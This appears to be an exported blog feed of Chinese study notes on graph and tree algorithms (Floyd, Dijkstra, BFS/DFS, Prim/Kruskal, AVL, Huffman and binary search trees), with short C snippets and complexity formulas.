<h3 id="特殊形态的图"><a href="#特殊形态的图" class="headerlink" title="特殊形态的图"></a>特殊形态的图</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803225437195.png" alt><br><img src="/2022/08/22/%E5%9B%BE/image-20220803225522718.png" alt><br><img src="/2022/08/22/%E5%9B%BE/image-20220803225858050.png" alt><br>树是连通图，有向树并不是强连通图</p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title>Floyd算法</title>
    <url>/2022/08/22/Floyd%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最短路径问题中求解带权图中各顶点间的最短路径<br><span id="more"></span></p>
<h2 id="最短路径问题——Floyd算法"><a href="#最短路径问题——Floyd算法" class="headerlink" title="最短路径问题——Floyd算法"></a>最短路径问题——Floyd算法</h2><p>使用动态规划思想，将问题的求解分为多个阶段</p>
<p><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822162139905.png" alt></p>
<script type="math/tex; mode=display">
若允许在V_k进行中转\\\\
若A^{(k-1)}[i][j]>A^{k-1}[i][k]+A^{(k-1)}[k][j]\\\\
则A^{(k)}[i][j]=A^{(k-1)}[i][k]+A^{(k-1)}[k][j]\\\\
path^{(k)}[i][j]=k\\\\
否则A^{(k)}和path^{(k)}保持原值</script><p><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822163032743.png" alt></p>
<p><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822163208295.png" alt></p>
<p><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822163313451.png" alt></p>
<p><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822163320676.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//准备工作，初始化矩阵A(即邻接矩阵)和矩阵path</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;n;k++) &#123;    <span class="comment">//考虑以Vk作为中转点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;    <span class="comment">//遍历整个矩阵</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i][j]&gt;A[i][k]+A[k][j])&#123;     <span class="comment">//以Vk作为中转点的路径更短</span></span><br><span class="line">                A[i][j]=A[i][k]+A[k][j];     <span class="comment">//更新最短路径长度</span></span><br><span class="line">                path[i][j]=k;                <span class="comment">//中转点</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
时间复杂度：O(|V|^3)\\
空间复杂度：O(|V|^2)</script><h4 id="Floyd算法实例"><a href="#Floyd算法实例" class="headerlink" title="Floyd算法实例"></a>Floyd算法实例</h4><p><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822164622091.png" alt><br>初始状态<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822164556099.png" alt><br>允许V0中转<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822164535721.png" alt><br>允许V1中转<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822164803197.png" alt><br>允许V2中转<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822165126097.png" alt></p>
<script type="math/tex; mode=display">
注意其中A[0][3]通过A[2]中转时:\\
A[0][3]=A[0][2]+A[2][3]已经考虑到了V_0->V_2->V_1->V_3的路程</script><p>允许V3中转<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822165455969.png" alt><br>允许V4中转<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822165812367.png" alt></p>
<h4 id="如何通过path矩阵寻找最短路径"><a href="#如何通过path矩阵寻找最短路径" class="headerlink" title="如何通过path矩阵寻找最短路径"></a>如何通过path矩阵寻找最短路径</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822165717520.png" alt></h4><p>弗洛伊德算法可以用于负权值带权图，但无法解决带有负权回路的图，这种图可能没有最短路径，如：<img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822170209802.png" alt></p>
<p>总结<br><img src="/2022/08/22/Floyd%E7%AE%97%E6%B3%95/image-20220822170311837.png" alt></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>图</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Dijkstra算法</title>
    <url>/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最短路径问题中带权图的单源最短路径问题的Dijkstra核心代码以实例<br><span id="more"></span></p>
<h2 id="最短路径算法——Dijkstra算法"><a href="#最短路径算法——Dijkstra算法" class="headerlink" title="最短路径算法——Dijkstra算法"></a>最短路径算法——Dijkstra算法</h2><p>BFS算法求单源最短路径只适用于无权图，或所有边的权值都相同的图</p>
<p><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822155010006.png" alt></p>
<p>循环遍历所有节点，找到还没确定最短路径且dist最小的顶点Vi，另final[i]=true,检查所有邻接自Vi的顶点，若其final值为false，则更新dist和path</p>
<p><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822155437661.png" style="zoom:80%;"><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822155614936.png" style="zoom:80%;"><br><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822160001351.png" style="zoom:80%;"><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822160016525.png" style="zoom:80%;"></p>
<p><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822155802078.png" alt></p>
<script type="math/tex; mode=display">
伪代码实现：\\
初始：若从V_0开始，令final[0]=true;dist[0]=0;path[0]=-1。\\
其余顶点final[k]=false;dist[k]=arcs[0][k];path[k]=(arcs[0][k]==∞)?-1:0\\
n-1轮处理：循环遍历所有顶点，找到还没确定最短路径，且dist最小的顶点V_i，令final[i]=true。\\
并检查所有邻接自V_i的顶点，对于邻接自V_i的顶点V_j,若final[j]==false且dist[i]+arcs[i][j]<dist[j]\\
则令dist[j]=dist[i]+arcs[i][j];path[j]=i.(注：arcs[i][j]表示V_i到V_j的弧的权值)\\
时间复杂度：O(n^2)即O(|V|^2)</script><p>注意：Dijkstra算法不适用于有负权值的带权图</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/22/Dijkstra%E7%AE%97%E6%B3%95/image-20220822170311837-16611674133291.png" alt></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>图</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>BFS算法——最短路径问题</title>
    <url>/2022/08/22/BFS%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最短路径问题中,BFS算法解决无权图的单源最短路径问题的代码实现<br><span id="more"></span></p>
<h2 id="最短路径问题——BFS算法"><a href="#最短路径问题——BFS算法" class="headerlink" title="最短路径问题——BFS算法"></a>最短路径问题——BFS算法</h2><h3 id="BFS求无权图的单源最短路径"><a href="#BFS求无权图的单源最短路径" class="headerlink" title="BFS求无权图的单源最短路径"></a>BFS求无权图的单源最短路径</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BFS_Distance</span><span class="params">(Graph G,<span class="type">int</span> u)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i) &#123;</span><br><span class="line">        d[i]=∞;  <span class="comment">//d[i]表示从u到i的最短路径，初始化路径长度</span></span><br><span class="line">        path[i]=<span class="number">-1</span>;  <span class="comment">//最短路径从哪个顶点过来</span></span><br><span class="line">    &#125;</span><br><span class="line">    d[u]=<span class="number">0</span>;</span><br><span class="line">    visited[u]=<span class="literal">true</span>;</span><br><span class="line">    EnQueue(Q,u);</span><br><span class="line">    <span class="keyword">while</span>(!isEmpty(Q)) &#123;		<span class="comment">//BFS算法主过程</span></span><br><span class="line">        DeQueue(Q,u);            <span class="comment">//队头元素出队</span></span><br><span class="line">        <span class="keyword">for</span>(w=FristNeighbor(G,u);w&gt;=<span class="number">0</span>;w=NextNeighbor(G,u,w))</span><br><span class="line">            <span class="keyword">if</span>(!visited[w]) &#123;         <span class="comment">//w为u尚未访问的邻接结点</span></span><br><span class="line">                d[w]=d[u]+<span class="number">1</span>;       <span class="comment">//路径长度+1</span></span><br><span class="line">                path[w]=u;         <span class="comment">//最短路径从u到w</span></span><br><span class="line">                visited[w]=<span class="literal">true</span>;   <span class="comment">//设置已访问标记</span></span><br><span class="line">                EnQueue(Q,w);      <span class="comment">//顶点w入队</span></span><br><span class="line">            &#125; <span class="comment">//if</span></span><br><span class="line">    &#125; <span class="comment">//while</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822152400138.png" alt></p>
<p>算法过程：</p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153144597.png" alt></p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153238514.png" alt></p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153332062.png" alt></p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153402310.png" alt></p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153436902.png" alt></p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153514478.png" alt></p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153522102.png" alt></p>
<p>三种算法对比<br><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822170311837.png" alt></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>图</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>MST的Prim和Kruskal算法</title>
    <url>/2022/08/22/MST/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最小生成树的prim和kruskai算法的实现思想<br><span id="more"></span></p>
<h2 id="最小生成树-MST"><a href="#最小生成树-MST" class="headerlink" title="最小生成树(MST)"></a>最小生成树(MST)</h2><p>最小生成树可能有多个，但边的权值之和总是唯一且最小的<br>最小生成树的边数=顶点数-1<br>只有连通图才有生成树，非连通图只有生成森林</p>
<h3 id="Prim算法"><a href="#Prim算法" class="headerlink" title="Prim算法"></a>Prim算法</h3><p>从某一个顶点开始构建生成树；每次将代价最小的新顶点纳入生成树，直到所有的顶点都纳入为止</p>
<p><img src="/2022/08/22/MST/image-20220822144757688.png" alt><br><img src="/2022/08/22/MST/image-20220822144926520.png" style="zoom:80%;"></p>
<h3 id="Kruskal算法"><a href="#Kruskal算法" class="headerlink" title="Kruskal算法"></a>Kruskal算法</h3><p>每次挑选一条权值最小的便，使这条边两头连通(原本已经连通的就不选)，直到所有结点都联通<img src="/2022/08/22/MST/image-20220822145315769.png" style="zoom:80%;"><img src="/2022/08/22/MST/image-20220822145256226.png" style="zoom: 80%;"></p>
<h3 id="Prim算法与Kruskal算法"><a href="#Prim算法与Kruskal算法" class="headerlink" title="Prim算法与Kruskal算法"></a>Prim算法与Kruskal算法</h3><p><img src="/2022/08/22/MST/image-20220822145611660.png" alt></p>
<h3 id="Prim算法的实现思想"><a href="#Prim算法的实现思想" class="headerlink" title="Prim算法的实现思想"></a>Prim算法的实现思想</h3><p>初始化<img src="/2022/08/22/MST/image-20220822145817443.png" alt><br>循环遍历所有结点，找到lowcast最低的，且还没加入树的顶点。再次循环遍历，更新还没加入的各个顶点的lowcast值<br>从V0开始，总共需要n-1轮循环，每一轮的时间复杂度O(2n)，所以总时间复杂度为(n-1)O(2n)=O(n^2)，即O(|V|^2)</p>
<h3 id="Kruskal算法的实现思想"><a href="#Kruskal算法的实现思想" class="headerlink" title="Kruskal算法的实现思想"></a>Kruskal算法的实现思想</h3><p><img src="/2022/08/22/MST/image-20220822150435335.png" alt><br>检查第一条边的两个顶点是都连通（是否属于同一个集合)————实现方法：并查集<br>检查第二条边的两个顶点是都连通（是否属于同一个集合)<br>检查第三条边的两个顶点是都连通（是否属于同一个集合)<br>·······<br>检查最后一条边的两个顶点是都连通（是否属于同一个集合)</p>
<script type="math/tex; mode=display">
共执行e轮，每轮判断两个顶点是否属于同一集合，需要O(log_2e)，所以总时间复杂度为O(elog_2e)</script><p>——————《算法导论》</p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>图</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>图的BFS和DFS的代码实现</title>
    <url>/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>图的广度优先遍历(BFS)和深度优先遍历(DFS)的代码实现<br><span id="more"></span></p>
<h2 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h2><h3 id="广度优先遍历-BFS"><a href="#广度优先遍历-BFS" class="headerlink" title="广度优先遍历(BFS)"></a>广度优先遍历(BFS)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> visited[max_vertex_num];            <span class="comment">//访问标记数组</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BFSTraverse</span><span class="params">(Graph G)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vernuml;++i)</span><br><span class="line">        visited[i]=<span class="literal">false</span>;                <span class="comment">//访问标记数组初始化</span></span><br><span class="line">    InitQueue(Q);                        <span class="comment">//初始化辅助队列Q</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)              <span class="comment">//从0号顶点开始遍历</span></span><br><span class="line">        <span class="keyword">if</span>(!visited[i])                  <span class="comment">//对每个连通分量调用BFS</span></span><br><span class="line">            BFS(G,i);                    <span class="comment">//vi未访问过，从vi开始BFS</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">BFS</span><span class="params">(Graph G,<span class="type">int</span> v)</span>&#123;                 <span class="comment">//从顶点v出发，广度优先遍历图G</span></span><br><span class="line">    visit(v);                            <span class="comment">//访问初始节点</span></span><br><span class="line">    visited[v]=<span class="literal">true</span>;                     <span class="comment">//对顶点v做访问标记</span></span><br><span class="line">    Enqueue(Q,v);                        <span class="comment">//顶点v入队列Q</span></span><br><span class="line">    <span class="keyword">while</span>(!isEmpty(Q))&#123;</span><br><span class="line">        DeQueue(Q,v);                    <span class="comment">//顶点v出队</span></span><br><span class="line">        <span class="keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="number">0</span>;w=NextNeighbor(G,v,w))</span><br><span class="line">            <span class="keyword">if</span>(!visited[w])&#123;</span><br><span class="line">                visit(w);                <span class="comment">//w为v的尚未访问的邻接顶点</span></span><br><span class="line">                visited[w]=<span class="literal">true</span>;</span><br><span class="line">                EnQueue(Q,w);</span><br><span class="line">            &#125;<span class="comment">//if</span></span><br><span class="line">    &#125;<span class="comment">//while</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于无向图，调用BFS函数的次数=连通分量次数</p>
<script type="math/tex; mode=display">
邻接矩阵存储的图，时间复杂度是O(|V|^2)\\
邻接表的广度优先遍历时间复杂度是O(|V|+|E|)</script><p>广度优先生成树，邻接矩阵生成的树是唯一的，邻接表生成的树不一定是唯一的</p>
<h3 id="深度优先遍历-DFS"><a href="#深度优先遍历-DFS" class="headerlink" title="深度优先遍历(DFS)"></a>深度优先遍历(DFS)</h3><p>visited数组防止重复访问</p>
<p><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220817160208534-16611666335431.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> visited[MAX_VERTEX_NUM];   <span class="comment">//访问标记数组</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFSTraverse</span><span class="params">(Graph G)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)</span><br><span class="line">        visited[v]=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[v])</span><br><span class="line">            DFS(G,v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(Graph G,<span class="type">int</span> v)</span>&#123;</span><br><span class="line">    visit(v);</span><br><span class="line">    visited[v]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="number">0</span>;w=NextNeighor(G,v,w))</span><br><span class="line">        <span class="keyword">if</span>(!visited[w])&#123;</span><br><span class="line">            DFS(G,w);</span><br><span class="line">        &#125;  <span class="comment">//if</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822104847638-16611666335442.png" alt></p>
<p><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111010384-16611666335443.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111023324-16611666335444.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111113241.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111143570.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111202426.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111218447.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111235582.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111255969.png" alt></p>
<p>空间复杂度：来自于递归调用，最坏是O(|V|)，最好是O(1)<br>时间复杂度：邻接矩阵——O(|V|^2)<br>                     邻接表——O(|V|+|E|)</p>
<p>注意处理非连通图（即使用一层for循环遍历图，通过visited数组判断是否已经遍历完成）</p>
<h3 id="广度优先和深度优先的对比"><a href="#广度优先和深度优先的对比" class="headerlink" title="广度优先和深度优先的对比"></a>广度优先和深度优先的对比</h3><p>广度优先使用的是队列，在BFS函数中通过while循环将一层一层入队元素<br>深度优先使用的是栈，在DFS函数中通过递归调用实现将一条路走到底</p>
<p>两种算法的复杂度是一样的，主要是看图的存储方式<br>注：邻接表不一样，得到的深度或者广度优先遍历序列不一样</p>
<p><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822113501088.png" alt><br><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822113548936.png" alt="image-20220822113548936"></p>
<p><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822113606400.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822113614038.png" alt></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>图</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>平衡二叉树以及哈夫曼树和哈夫曼编码</title>
    <url>/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>平衡二叉树转换的四种情况解析以及代码实现。哈夫曼树以及哈夫曼编码的原理</p>
<span id="more"></span>
<h2 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h2><p>简称平衡树（AVL树）——树上任一结点的左子树和右子树的高度之差不超过1<br><strong>结点的平衡因子</strong>=左子树高-右子树高<br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709234821736.png" alt></p>
<h3 id="平衡二叉树的插入"><a href="#平衡二叉树的插入" class="headerlink" title="平衡二叉树的插入"></a>平衡二叉树的插入</h3><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709234957697.png" alt></p>
<p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709235020317.png" alt><br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709235353920.png" alt="image-20220709235353920"><br>假设的子树的高度一定都是统一的一个值H</p>
<h4 id="LL"><a href="#LL" class="headerlink" title="LL"></a>LL</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709235550956.png" alt></p>
<h4 id="RR"><a href="#RR" class="headerlink" title="RR"></a>RR</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709235832689.png" alt></p>
<h4 id="代码思路"><a href="#代码思路" class="headerlink" title="代码思路"></a>代码思路</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000110322.png" alt></p>
<h4 id="LR"><a href="#LR" class="headerlink" title="LR"></a>LR</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000356369.png" alt><br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000444260.png" alt><br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000533083.png" alt></p>
<h4 id="RL"><a href="#RL" class="headerlink" title="RL"></a>RL</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000716645.png" alt></p>
<p><strong>插入操作导致最小不平衡子树高度+1，经过调整后高度恢复</strong></p>
<h3 id="查找效率问题"><a href="#查找效率问题" class="headerlink" title="查找效率问题"></a>查找效率问题</h3><h3 id="最坏时间复杂度O-h"><a href="#最坏时间复杂度O-h" class="headerlink" title="最坏时间复杂度O(h)"></a>最坏时间复杂度O(h)</h3><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710001904807.png" alt><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710001932928.png" alt="image-20220710001932928"><br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710001948415.png" alt="image-20220710001948415"></p>
<p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710002053754.png" alt></p>
<h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><p>结点的权：有某种现实含义（如：表示节点的重要性）<br>结点的带权路径长度：从树的跟到该结点的路径长度（经过的边数）与该结点上权值的乘积<br>树的带权路径长度（WPL)：书中所有的叶子结点的带权路径长度之和<br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710002632003.png" alt><br>哈夫曼树的结点总数为2n-1<br>哈夫曼树中不存在度为1的结点<br>哈夫曼树并不唯一，但WPL必然相同且为最优</p>
<h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><p>固定长度编码——每个字都用相等长度的二进制位表示（ASCII编码）</p>
<p>可变长度编码<img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710003458543.png" alt><br>前缀编码：没有一个编码是另一个编码的前缀</p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>密码学</tag>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉排序树</title>
    <url>/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>二叉排序树的原理以及基本操作</p>
<span id="more"></span>
<h2 id="二叉排序树（BST）"><a href="#二叉排序树（BST）" class="headerlink" title="二叉排序树（BST）"></a>二叉排序树（BST）</h2><p>二叉查找树<br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709231736496.png" alt><br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709231745186.png" alt><br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709231900686.png" alt></p>
<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BSTNode *<span class="title function_">BST_Search</span><span class="params">(BSTree T,<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(T!=null&amp;&amp;key!=T-&gt;key)&#123;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;T-&gt;key)</span><br><span class="line">            T=T-&gt;lchild;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            T=T-&gt;rchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;<span class="comment">//时间复杂度O(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//递归实现</span></span><br><span class="line">BSTNode *<span class="title function_">BST_Search</span><span class="params">(BSTree T,<span class="type">int</span> key)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==null)</span><br><span class="line">        <span class="keyword">return</span> null;</span><br><span class="line">    <span class="keyword">if</span>(key==T-&gt;key)</span><br><span class="line">        <span class="keyword">return</span> T;    <span class="comment">//查找成功</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key&lt;T-&gt;key)</span><br><span class="line">        <span class="keyword">return</span> BSTSearch(T-&gt;lchild,key);   <span class="comment">//在左子树中查找</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> BSTSearch(T-&gt;rchild,key);   <span class="comment">//在右子树中查找</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//时间复杂度O(h)</span></span><br></pre></td></tr></table></figure>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709232619239.png" alt><br>注意插入操作是引用类型<br>最坏空间复杂度O(h)</p>
<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709232821433.png" alt></p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709233303115.png" alt></p>
